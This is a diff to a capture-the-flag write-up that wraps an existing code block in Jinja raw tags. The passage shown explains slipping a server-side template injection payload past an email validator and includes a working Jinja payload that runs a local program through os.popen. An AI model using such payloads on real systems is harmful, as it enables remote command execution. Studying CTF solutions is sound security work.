@@ -27,8 +27,12 @@ test@example.com
 
 Using that we can bypass the restrictions on from email-validator which lets us put our SSTI inside the quoted message.
 
+{% raw %}
+
 ```
 "{{cycler.__init__.__globals__.os.popen('../getflag').read()}}" <e@e.eu>
 ```
+
+{% endraw %}
 
 Running the `../getflag` program will give us the flag.
